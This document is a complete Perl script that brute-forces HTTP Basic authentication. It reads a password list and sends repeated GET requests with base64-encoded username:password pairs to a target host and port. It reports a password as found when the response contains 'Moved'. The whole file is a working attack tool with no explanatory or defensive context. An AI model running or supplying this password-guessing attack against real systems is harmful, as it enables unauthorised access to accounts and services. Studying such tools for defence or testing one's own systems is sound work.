#!/usr/bin/perl
use IO::Socket;
use LWP::Simple;
use MIME::Base64;

$host   = $ARGV[0];
$user   = $ARGV[1];
$port   = $ARGV[2];
$list   = $ARGV[3];
$file   = $ARGV[4];
$url = "http://".$host.":".$port;
if(@ARGV < 3){
print q(
);exit;}

headx();

$numstart = "-1";

sub headx() {
print q(
);
open (PASSFILE, "<$list") || die "[-] Can't open the List of password file !";
@PASSWORDS = <PASSFILE>;
close PASSFILE;
foreach my $P (@PASSWORDS) {
chomp $P;
$passwd = $P;
print "
 [~] Try Password : $passwd
";
&brut;
};
}
sub brut() {
$authx = encode_base64($user.":".$passwd);
print $authx;
my $sock = IO::Socket::INET->new(Proto => "tcp",PeerAddr => "$host", PeerPort => "$port") || print "
 [-] Can not connect to the host";
print $sock "GET / HTTP/1.1
";
print $sock "Authorization: Basic $authx
";
print $sock "Connection: Close

";
read $sock, $answer, 128;
close($sock);

if ($answer =~ /Moved/) {
print "
 [~] PASSWORD FOUND : $passwd
";
exit();
}
}